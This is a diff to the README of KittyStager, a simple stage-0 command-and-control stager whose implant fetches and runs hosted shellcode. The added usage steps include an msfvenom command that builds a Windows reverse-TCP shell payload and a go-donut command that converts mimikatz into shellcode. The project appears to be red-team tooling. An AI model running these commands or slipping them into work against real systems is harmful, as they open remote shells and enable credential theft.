@@ -10,6 +10,7 @@
 KittyStager is a simple stage 0 C2. It is made of a web server to host the shellcode and an implant, called kitten.
 The purpose of this project is to be able to have a web server and some kitten and be 
 able to use the with any shellcode.
+
 **I would not use this project in red team, at least not now.**
 
 
@@ -44,6 +45,11 @@ go build -o basickitten
 ./basickitten
 ```
 How to use :
+Generate a shellcode. It works with any shellcode in bin format or in hex format.
+```
+msfvenom -p windows/x64/shell_reverse_tcp -f hex -o rev.hex LHOST=127.0.0.1 LPORT=4444
+go-donut.exe -i mimikatz.exe
+```
 ```
 ~kittyStager ❯.\kittyStager.exe -p path/to/config/file
                      _
@@ -87,7 +93,7 @@ Path: ..\..\shellcode\shellcode.bin
 [+] Key generated is : TARGETTARGETTARGETTARGETTARGET
 [+] Shellcode hosted for 127.0.0.1 
 ```
-
+It also works with donuts shellcodes
 ```
 ~basicKitten ❯ .\basicKitten.exe
 
